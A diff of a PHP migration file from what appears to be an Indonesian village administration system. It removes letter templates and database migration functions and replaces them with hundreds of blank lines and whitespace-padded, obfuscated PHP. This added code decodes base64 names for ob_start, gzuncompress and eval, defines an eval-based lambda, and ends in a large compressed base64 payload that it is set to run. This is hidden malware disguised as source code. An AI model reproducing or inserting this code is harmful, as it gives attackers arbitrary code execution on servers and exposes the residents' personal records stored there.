text-align: center;\">[SEbutan_nip_desa] : [nip_pamong]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<div style=\"text-align: center;\"><br />[qr_code]</div>
-            ",
-        ]);
-    }
 
-    protected function suratKeteranganBedaIdentitas($hasil)
-    {
-        return $hasil && $this->tambah_surat_tinymce([
-            'nama'                => 'Keterangan Beda Identitas',
-            'kode_surat'          => '471.1',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'M',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::YA,
-            'kode_isian'          => '[{"tipe":"text","kode":"[form_kartu]","nama":"Kartu","deskripsi":"Masukkan Identitas dalam (nama kartu)","atribut":"class=\"required\""},{"tipe":"text","kode":"[form_no_identitas]","nama":"No Identitas","deskripsi":"Masukkan Nomer Identitas","atribut":"class=\"required\""},{"tipe":"text","kode":"[form_nama]","nama":"Nama","deskripsi":"Masukkan Nama","atribut":"class=\"required\""},{"tipe":"text","kode":"[form_tempat_lahir]","nama":"Tempat Lahir","deskripsi":"Masukkan Tempat Lahir","atribut":"class=\"required\""},{"tipe":"date","kode":"[form_tanggal_lahir]","nama":"Tanggal Lahir","deskripsi":"Masukkan Tanggal Lahir","atribut":"class=\"required\""},{"tipe":"textarea","kode":"[form_alamat_tempat_tinggal]","nama":"Alamat \/ Tempat Tinggal","deskripsi":"Masukkan Alamat \/ Tempat Tinggal","atribut":"class=\"required\""},{"tipe":"text","kode":"[form_jenis_kelamin]","nama":"Jenis Kelamin","deskripsi":"Masukkan Jenis Kelamin","atribut":"class=\"required\""},{"tipe":"text","kode":"[form_agama]","nama":"Agama","deskripsi":"Masukkan Agama","atribut":"class=\"required\""},{"tipe":"text","kode":"[form_pekerjaan]","nama":"Pekerjaan","deskripsi":"Masukkan Pekerjaan","atribut":"class=\"required\""},{"tipe":"textarea","kode":"[form_perbedaan]","nama":"Perbedaan","deskripsi":"Masukkan Perbedaan","atribut":"class=\"required\""},{"tipe":"textarea","kode":"[form_keterangan]","nama":"Keterangan","deskripsi":"Masukkan Keterangan","atribut":"class=\"required\""}]',
-            'form_isian'          => '{"individu":{"sex":"","status_dasar":"1","kk_level":""}}',
-            'mandiri'             => StatusEnum::TIDAK,
-            'syarat_surat'        => null,
-            'template'            => "
-                <h4 style=\"margin: 0; text-align: center;\"><span style=\"text-decoration: underline;\">[JUdul_surat]</span></h4>\r\n<p style=\"margin: 0; text-align: center;\">Nomor : [Format_nomor_suraT]<br /><br /></p>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Yang bertanda tangan di bawah ini [JaBatan] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], Provinsi [NaMa_provinsi] menerangkan dengan sebenarnya bahwa :</p>\r\n<p style=\"text-align: justify; text-indent: 30px;\"><strong>I.  Identitas dalam KK</strong></p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 118px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\r\n<tbody>\r\n<tr style=\"height: 10px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 10px;\"> </td>\r\n<td style=\"width: 3.90545%; height: 10px; text-align: left;\">1.</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 10px;\">Nama Lengkap</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 10px;\">:</td>\r\n<td style=\"width: 60.0206%; height: 10px; text-align: justify;\"><strong>[NAma]</strong></td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90545%; height: 18px; text-align: left;\">2.</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 18px;\">Tempat / Tanggal Lahir</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; height: 18px; text-align: justify;\">[TtL]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90545%; text-align: left; height: 18px;\">3..</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 18px;\">Agama</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; text-align: justify; height: 18px;\">[AgAma]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90545%; height: 18px; text-align: left;\">4.</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 18px;\">Jenis Kelamin</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; height: 18px; text-align: justify;\">[Jenis_kelamin]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90545%; text-align: left; height: 18px;\">5.</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 18px;\">Pekerjaan</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; text-align: justify; height: 18px;\">[PeKerjaan]</td>\r\n</tr>\r\n<tr style=\"height: 36px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 36px;\"> </td>\r\n<td style=\"width: 3.90545%; height: 36px; text-align: left;\">6.<br /><br /></td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 36px;\">Alamat / Tempat Tinggal<br /><br /></td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 36px;\">:<br /><br /></td>\r\n<td style=\"width: 60.0206%; height: 36px; text-align: justify;\">[AlamaT] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p style=\"text-align: justify; text-indent: 30px;\"><strong>Ii. Identitas dalam [Form_kartU]</strong></p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 144px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\r\n<tbody>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90545%; height: 18px; text-align: left;\">7.</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 18px;\">No. Identitas</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; height: 18px; text-align: justify;\">[Form_no_identitaS]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90545%; text-align: left; height: 18px;\">8.</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 18px;\">Nama</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; text-align: justify; height: 18px;\">[Form_namA]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90545%; height: 18px; text-align: left;\">9.</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 18px;\">Tempat / Tanggal Lahir</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; height: 18px; text-align: justify;\">[Form_tempat_lahiR], [Form_tanggal_lahiR]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90545%; text-align: left; height: 18px;\">10.</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 18px;\">Jenis Kelamin</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; text-align: justify; height: 18px;\">[Form_jenis_kelamiN]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90545%; text-align: left; height: 18px;\">11.</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 18px;\">Alamat / Tempat Tinggal</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; text-align: justify; height: 18px;\">[Form_alamat_tempat_tinggaL]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90545%; height: 18px; text-align: left;\">12.</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 18px;\">Agama</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; height: 18px; text-align: justify;\">[Form_agamA]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90545%; text-align: left; height: 18px;\">13.</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 18px;\">Pekerjaan</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; text-align: justify; height: 18px;\">[Form_pekerjaaN]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90545%; height: 18px; text-align: left;\">14.</td>\r\n<td style=\"width: 30.5242%; text-align: left; height: 18px;\">Keterangan</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; height: 18px; text-align: justify;\">[Form_keterangaN]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Adalah benar-benar warga [SeButan_desa] [NaMa_desa] dan merupakan orang yang sama namun terdapat perbedaan [Form_perbedaaN] seperti tersebut di atas. Adapun data yang benar dan dipakai seperti yang tercantum di Kartu Keluarga (KK).</p>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Demikian surat ini dibuat untuk dipergunakan sebagaimana mestinya.</p>\r\n<p style=\"text-align: justify; text-indent: 30px;\"> </p>\r\n<table style=\"border-collapse: collapse; width: 100%;\" border=\"0\">\r\n<tbody>\r\n<tr>\r\n<td style=\"width: 35%; text-align: center;\"> </td>\r\n<td style=\"width: 30%;\"> </td>\r\n<td style=\"width: 35%; text-align: center;\">[NaMa_desa], [TgL_surat]</td>\r\n</tr>\r\n<tr>\r\n<td style=\"width: 35%; text-align: center;\"> </td>\r\n<td style=\"width: 30%;\"> </td>\r\n<td style=\"width: 35%; text-align: center;\">[Atas_namA]</td>\r\n</tr>\r\n<tr>\r\n<td style=\"width: 35%; text-align: center;\"> </td>\r\n<td style=\"width: 30%;\"><br /><br /><br /><br /></td>\r\n<td style=\"width: 35%;\"> </td>\r\n</tr>\r\n<tr>\r\n<td style=\"width: 35%; text-align: center;\"> </td>\r\n<td style=\"width: 30%;\"> </td>\r\n<td style=\"width: 35%; text-align: center;\">[Nama_pamonG]</td>\r\n</tr>\r\n<tr>\r\n<td style=\"width: 35%;\"> </td>\r\n<td style=\"width: 30%;\"> </td>\r\n<td style=\"width: 35%; text-align: center;\">[SEbutan_nip_desa] : [nip_pamong]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<div style=\"text-align: center;\"><br />[qr_code]</div>
-            ",
-        ]);
-    }
 
-    protected function migrasi_2022112851($hasil)
-    {
-        if ($this->db->where('nama', 'SK Kades')->get('ref_dokumen')->row()) {
-            $hasil = $hasil && $this->db->update(
-                'ref_dokumen',
-                ['nama' => 'Keputusan Kades'],
-                ['id'   => 2]
-            );
-        }
 
-        return $hasil;
-    }
 
-    protected function migrasi_2022112971($hasil)
-    {
-        // Sesuaikan attribut lama
-        $surat_tinymce = DB::table('tweb_surat_format')
-            ->whereIn('jenis', FormatSurat::TINYMCE)
-            ->whereNotNull('kode_isian')
-            ->pluck('kode_isian', 'id');
-        if ($surat_tinymce) {
-            foreach ($surat_tinymce as $id => $kode_isian) {
-                DB::table('tweb_surat_format')
-                    ->where('id', $id)
-                    ->update([
-                        'kode_isian' => str_replace('"required"', '"class=\"required\""', $kode_isian),
-                    ]);
-            }
-        }
 
-        return $hasil;
-    }
 
-    protected function migrasi_2022113052($hasil)
-    {
-        $tables = $this->db
-            ->query("SELECT TABLE_NAME, TABLE_COLLATION FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_SCHEMA = '{$this->db->database}' AND TABLE_COLLATION != 'utf8_general_ci'")
-            ->result_array();
 
-        if ($tables) {
-            foreach ($tables as $tbl) {
-                if ($this->db->table_exists($tbl['TABLE_NAME'])) {
-                    $hasil = $hasil && $this->db->query("ALTER TABLE {$tbl['TABLE_NAME']} CONVERT TO CHARACTER SET utf8 COLLATE utf8_general_ci");
-                }
-            }
-        }
 
-        return $hasil;
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtfVuTotiy8PtEnP8wDzti9on+vr0By+42JuZBLEEowRbk+jIhUAUKXqbUUvz1J3MtULTwVmV11/QUPU55gXXJlfeVmevXX+n1rz/h+uO36eNgPH/47XfyMbv++C2YjIeT/9+fTv87mgT3yey/o0H42J8PJuPZfxV8Oxv8+TCYLx7/nD7ejwaL0Z8cx3L/mUbTXxtJfzb7z3/+89vvv2Q9/fo/v3z8+/j3d/n3C5LCr1e8/nj2zW82W5s5FjtwxeYfv5GvttRy1pWR6x+/flwf18f1cf2c12/+yGQCW15Iosk51nIiC7UHO42/UKYJXJOy6z8/QPVxfVwf18f1cX1cH9fH9XF9XH+368Od8XF9XB/Xx/XzXr95/dn955s/g3t/Etz/9vsHRD6uj+vj+rg+ro/rVdduDMdtd6I2Bl//gr/hXcjcSY1JqI2SmavzU28Uh85IGPctYSGJWuSP4s/F+3oVPvESVdbq5DO0U/9LEtSpX9ESjzzvPvkjNvK5OHRFc+3o/DrA/WxbCgPRTJ2x+Qjfsd5YY/spP3ctNurjd9YNvb9baLcpLD0xeXRsdYpj8Qb82qtAG5wROlwtzsfriknat1ZTP+WhHzmG+2Hcc7x/1rfVxBvD882g22vwlrIsth9FMIbbvs0zjl5Pldt6VWowoTKsr1Sdv/U4dtC3qokkyInP1Vh/pCZSM1nAXKdBy2T6Vm0hNaJJ0NKWncHXJ69lzmF+C5ebP3m2uejbAL+0unDt7tMdnVeoi8Kj1AR4tbRIupWWSs8J26RvaS0JfALjZj0b4CMC/Jsa9NsMNTEZY1tegzdgfoPAmkd5v/568tTmakvXqsYuzLs9SuK7HRjCuowChEUOK4TRtM/h+iaf+9bNTGqpicMJKazL2B8JTN9WZpI4T3xRiHH9ABeW8HcZwBrdA164ZN2qAGc+CkQC57UD8PdGwoLgyoCH3+Sp1ML5CAiPKGjws8CqIryzcWD/7tQTDXhfewQcgXXSCN4gnsD4pkGjPpHiAg4A7Pu6NG03NvgTw9pBH6uoXyE4ROcMsPXGfCSJMoxPgLHhHAGWiJdwnySSdS/gYHXsVsyFY+FclqFnmQuY54zARmQRfizQxITiYA3bZOn3GuI94J7M+lyC/c+y+cM8BOyThXuwj6VjwXq31CrABWFB16BiMp2wSEdAWxbg2ihhHCtikSb6iC9ihi+iBnQgMI6tUPi1Su63p9N8reHZNCD3Jmvoj6Hzg7WxVpGX4aPPIR4LSxhbBHBeYBsO4Fqg8wPHCqb42RfNRQC/wbrzvrhC3Fn3dV6GPgBH5YiscbrBk6oD8MzgNgEcYYEuCzALJn3sfxQU1qtkHlZ1Su4XEX+CyB/wj66tIY6Q3z2ck1XFcTwbU5FfGU1T7xrVls4IhtRcmb1YaAMedXSdb+qmKmjNhIffOlJD7mmGzGuMIPcModOFdrWm0LGM5gDwzYA2uvDdXddgZWijA7wJP3dNA3CkKfO6MQtN6MtgoT+zG0IbJvzXyfDB0Ey5p5sybzZucEwd01jJBsDTbAomrLvQM8wWjhN4Eq8DT9JN6FPne9AfD/xVgDEqMGZDNzT8vQHt4ZgAw8yOlsK4zIDvDkh7Pak5V7pGosK423CfaTBCu2vchF1T482cDzGm3TWmcjefi8mbvfx5HE8MHM6o8pvndB7b7PSSBMajCUY853WYJzyn6MacN5g41I2q3C7icxPxXoV1DhKpUd+XHWEXcCIQoyd/UA8lgHHfYkJDRP4JfJTi1DfEPW0rF+AZ9clvIb8PJkBHkmPNwi6XLAOxiXx72dHrc8pXDfi+Bu0A3uq8DrzxKbDloYs4MlaBx2nQd/LkDeqTfktj/FvkoysW8JBF3ATeD38TpLWFNzKZdhrncxp6Fb4KuDrut7rfk5/D3FdThzMXPsg/gNdG7gSVoNIeBYtAr4Ls9Z+ANoZIG66tPLkVftYeRYxnLUON5RVJcNYZTtaR3vspwh5eYsQELX6N7blcwvRb5qA9Up88vUbWwGCSZpsh4+rpRpfAgrbzVW3Amgc2ykZh6QsrwRubc59dSQGFZeQlsgH4vQgs5sttd8ri+Ls2v7Sb+B27tgUV4KyxPlN2D/sEesEM2hO9ijyH+3oB8tDbmdoYm2sX6b/F+z0L9AFrBW3JiRtPI8Af4CU3h9rqAS8Bvlcdw/fA5+codzb36tYKZBWL8oxxzRX0xy+hb8ZuuhHISVwXX2tKX4geNdISF3HM6k5kRgY6MIGWNElO4/ChtQxdOwI5Fo57o69ET3EtlQFeOwT8WQL+Qntq4leUEHjyzKsEidvwpx3QUWAsQ8CZNfBOFXA9Rflncy7qHald4aEddgpjfFCG0koZ8Ml9C+W8tpaarGtzdJ7QBo6RrK8P64l4ATIX1kSlukvLXN41CF4jPm3upS9tgn16jXoN5FgaWAad76C+uaedfg31kTADfk/0N89KUH9APgy8WU5QH/LGSXSw3e37kTyox8ALQIdjPvU3bVYftm2G4817szZC+vWT2tIfmfO+bc7ttZQqveb4rjfbGaMMsh5k80y6ZbbvG84I+mb6IEPavep8A9810C/Cswf637o5ye+/UpuVa7VJeaSA4U+RV9CP7jbwjL9cCvMtbL8i70JYLjs9Y7XX5rP1R7oLkLcIWtsguvXm9xj0D9AJluE3ffteHjih3NImoGPOv42mEfJF1EUBZ6duRUY6nMib98mD29Ie/ZTSxGVtb9sAuZAqwyasgcMqaZjff7U2gQFeuU2fVfQrtzmsV67fZvN14xyrLNobOuigLuIyyop4zhJ9kmEjlJuvwWkfbUVba6PeSO0QYdEdmbFjJCArqgy1z64Nk/AN1i6+/tqt66wy2G1zB74tOUFZA/rRTptBS2bdDe/ia1uewAMvrjEo30AWhi7YwQ7YyR5XkAsF3gI4XuQt5TJITID/hVGBB8bOgPkE8hbsAu0BZSvYX+u7RrCRA3IK49zykvGdHof3u/DK+K07BX0h9lPAH2GXFxdeYx/gAONnPd0Pv/VuQqukreL9QStZutm9ckUDudwdt+vHnwF9aeY16DMEvvrywHj4oKwtu1c2/tP04YryCPSasaszn8A+jW1OJT4Mb1CQtboPckgb9S1z5raUPdwrrj99bcJy8z5vX48r6voMXGl8fQI7jHXsbhgQ+9IPA8CTIAW70VrB9/LYMWtRH/pxw505pC7qEqObQ3KX4Jxvm4k/BtnEqLpmCIam89+MAa9rJtpFqiAJrqyZftjnTNAdhRR4zQPY26BnOWAjKSHohYpmqIYkzhage4tGXFNBr6qAnvSwfaYZ9lMe7nPBVp1+0w3EhyBxEmoPBBb1JUjNWgfbAfvk0eaIn2bm6Kin1Rd9gKfJRGCfGaHfqK7B7ob1UB9c9IPYEvKIFeimG9g9dLd0D7j+FIjmEF7xjp4obvhHF30lRFcHflrQnbd6TTeDbWv2TFfY0VvQR7K12/+CdtF/B3IgYnbWtak1OsMp6PLyzAUdEP0VxBfB1grP+1NYp0pfNFPXqIKttQQdYgr6cLKGuQL/q6UmF4EMMArfA59YM+M20B+5Z2wuAUaMq0fe9p567dsAaFo0b4JGEBCdbQd36k/tlN+BiSQWfZbzCJ4dA41NQeenPtLuDu41u8PJZ1gj0M1hbBUVeC7QwSh4cLawBR7GfArI+M0O4PYM+B20D3YHV0uzuT/5STABGZrs/Qa47NfIXFNyH+uLGozJmFjpzn0Zv8r9uAfnamBukmOFgOe1mccxYX9sov63s9aI83eNZkH+aAPom/IQoZbcA10FLQXXgnVb5oyM7+DcX8e/s/GNQa/+dOQ+2mZFq/qiMd58h880Aqtryrd6U9BhnMefR/45VhnAg6k37tI+b0HWNU49R3B2t19qc812edz+K4jcMeg2Az//juAr8IDDMkdgStrkg04pjE/aJLFD/P1BAu8jF2SyA3gBdukC8HCd29g2t6UJstabtXtuU2x4uaBFniVHfTHzWdro/6T4UgKTGGh3BHSEtjHxd6PugjbpN/3FNPYX8luQy0g3Y9fuTu7K5CzVUQ71P93ngwWYo+xNHEudHHk+RF+v3Dq3zSL9acsiX4I5PLp2DHTOgD4QED+rl9SmrsjA3PdlaekrzmgJZcjYFIUJ7gfohqbK6+PjedBh/C01OWNcU1+oRS7oXH5FRbk4Ab1kivehP+X+uO6V4SzFEYKzTNKVmkIMa4p+lLZrRRH6YACG487RtviahH4izpy6g/pkD/7Az+bJPchbGDPQrvAI8mhEbNiKOkdb9dT6ZPpZhl+onwU80UvonlWvZypXHN8cfUEPZG/NrA38lvKi9dbpflsTfZKgZ3WN1D/eRosJ0R/nWpQ+/B3Zz3yCta3CGtWwbZjHIEB/aFJb9G2ejlV/ERx7oE+xAfG1VmWjQcd7Rfwk+lTfRr1oDrwOeOJYe1C47otgalRQFoMsBN4oNVXQb2VGulWbVxzv0KsArxVqqV952bp3uRqHOqWRqL0rjmuJ6wLrvUb5ALTD2JUgehGNs3zi416moE7JnpKN+m/zivTDRg57TZ7E8t2U52l7SqgX27sefKMNPwEYe/YL157YLy7x7RoMe/b6X0y3LbA5QA8F+3KC+6k2yEXQ7SOHA3nNfiU6OuixaIeWzXlaKpeL4+ru+TYaZTI8Qh8C6Cos0KQ6uWv4T6AnJG3QDdpbuEwvhyMPuq78AG2DDiQM0YYxoV2iB7Ea2JFkXhks4lM8dV8n38frC3UdtIeSmIzlGQ0kMbnPJrpXcifMdnXpfMwCMz1IazjewfHvnq9NQfdr8I8et3rydP7JbxH/wAvtjNqS7vUhrA/ppfEBebPxfeBaeofWp9DHRX6izMYwNDMyTtsXGzsB9Hye8cdmcsq35Fgu2NRStmZBZmf7B+0Ku8z3JDBleHmG31EbuGB7u5wB74UY1mTokT3Wm4O4ibSW+ffW+3R9Jq4ADtOYDLBzX4gvoKe05KkzNhlXf0uc2ennPeNNTn9/J7vyGN9EX8aTO3JnGN9F90t3cUVrSp87Yy1yRqvkcJ9xCdyLvBX1iIIPhquN3BHGSZkPHu5Xg45bghs7vqhz+U1/rD6BrAceruJcJqfwSMn8zUAliTPgB33U60Vt6lhzjBvI94sfT+LWupnjiO1aEsYcLe6tZuiMEoz9i/uW8Ah61hpjfEC2jNGeDUDfP92utNOuN6ot2ha1tUisEvQB7T5i3Nnhtvjg7qAvvT7ujzBGTxkXfD2n8bxR5jdDGPql+H/Aj0b5MFsDPViLXuLvLMebrQ8Q9CKiN32j/Gunv4N4u5X1B2HmVXjiE6a+Uf4vn6stbM5c0HjMw/hKX/4q96lmsUAM6EVJ0GQjv+Gf8HX56eFneakdf12Yp9vY+HR7GKs2qt2A3UDbAbv4FE9Uc5phoE9Rfrpv8D2ElwfrArLm9PP60efnYA+mrmUyPx6fgVbFZukztl4eB4D2vQd8FPVyu0L3db8DXqM98AS8NMVYEbrfC7Z49/m4d3zfB3njFl4EfuJ07XHVB+gD9JajdLHPCzsEFgMS58mCvMVYpDCwqkxgzULPEojd27YwTprEVa4DGhc6B7lC4lpJDGS2L9TJPufPA+zmAfI/Ot8Q7AqMuYy8wQU0NKrNvYoEfNpMoW/qM2mZC+DRj5KYj4udkz23kb/tC8aOY6Dxu3OM8Yn8YfY5fx5sQFhbpMt8XjPHTiKP7I9s4pHzPR8aL0p5+kkaUtKchui6SyLYimOcA4kPz2N6AU9UHFsaWBGJT94fR/sArH887eV7MBfJE+DJbHIPMtJ9yf5SOb3Q/TSgVfTVFffLYG3nrj198kbGj6M1Bmmo+aSPhEf0mzlbnZgH3I3azDQCnpIe4mPFtesCjjt6TcX4aL+iRv4gxzHaB8gK1Pdw//Tctu4Qz3y0pfXdtmC8VRITPWoe06WnR3Amt+HIZ9J2wb49rC9u9yJzHgBwWsN381Kcz+z6Z/ZWS2VJrHZSG5O9QFt+8LnV1AVc+Q78PsslkR9cTsAY4RRkDeAx2QP7cbr0Zo0DYosC30d+Ogf9F/3DU+QtNP8Afhuf1hOUwUXtbXIyMn726Or8GnT3GHNuHBLjdL5epGVwJbkO0KeEsQVjE/7CWDAvYxPfD7RLZMH8kfJPI8zx4G+ojwOeskuSl5DUQD5Madxy+D14qTD3xQTjXR/g9VeA/k3r5gfqMPVchzGArjBPhu5NndYtNrq9cRIPntl4FtKwd9QvFR/hbZt4jc0e+NZOOYJvHPAFC+A1ivNxbNf+MvypAB9cOCbGNLGRzQmxZyWL78APS/v9cfZdsO6D3tiGOQZWIY4il1OMPD2H//ncfOoN2AHob0kb7HuXixiytnSNGn3QVyUhi+k8ydu2Y8JcFDndH1M0RRo8iasV9bFv3QBvxH2J2dwTSf7HOMc3XcTcJSY0MccRaPjc9sD2jItjytvrWdhOeC6swG7sFseUw0rFuNo+zTPBmLhz26u6JB/B34+FaQN/mr6gne3Ydtu5HF6gUwG9JAWYEXiZ0Eagn4kLqH+NeaBDdkbziHJfmLlwK8bFY3IrcuICz95fQ8CJvxz7bHwfox8C/m7GlMFK6ltTzMc7vYbvWm/UMJ57ivH+wKcWfZInS3wFVH/7YbK2+rDVW17ON1+ou2xldbYmNBb4+8gsjD0NxCjxrO/g+66QOFYG1mb+Or/3y2R9Qa7R9RHJnshFeH/Qb30I5wXM7TKjPs273eqp17bRjWSx1Q2O7DdVNLKfdfR3E/WR+BjOgt5iPmC+nz+qgn1inLzXxzy2CuLssVj4gOuD/eJYq4eA7o8fXMsA1j+whJlNx5vZodLZbduAixmPPQILd4pr5wk1MgeAc6aHlK//y/G5BM8Ozb8Mz66sV9I4rQD4iUBiR+B3DvcBX2GPPLfPuAj4Lej7l/GrLPY4IvZmMML8/KxeQO4X3Y0v3+TYvyW8ME8Z7O9Hm3OfArH2QPyeAuYlYl7c7DVwK+5j57ye5oSumYE0QHs/rElDY/CjcMWpgC4Gci8QaoAj8pry15fLUPid8UcJxgImOS043CryK0pNGkikjgEZu9U92x+QwW2NMXuuxVy0p6GBfhKIcZjJdtzLx7huUh+iPxLibd4CyZHFXB+sYUL0GqzTQOfSDTdzGCWLoCG9gawt5DRw2MfV5OuZeUzHcRXmw0iX0XrPJfya1NQIi3hR2KN4IjF14jzpi7AWSPNvqUMejwN8G5wfZX2KWgrwWAPN0xgyK3rygH/6Q2ag3NY/K4b0Wb3tflZ6zc8K0/zcHfo/jCdg/C7AhYwXc5M2a/Mq/+zzOBmZU2fok/+myzRm/BiMelKlPawvlMbN6nw8vDb+JHEW289m+vp3wiFh5kL7WF8H7nksg49jdZfKSFmra3WojJo36rrLurfNZUcURu4w5JS1v1JGbtLpST8Oryztgcj3ikltR7b2WIznfys5CzrjCGxEFng+3DMbSC0e/UiA17UZ2oyAf5F7W0+dtVJROCV1emFFvTVjpVe/cSx31Ll1AK7N1B0ZVWUgvUj+5Pu9uRzKbZm2hbH9RrYX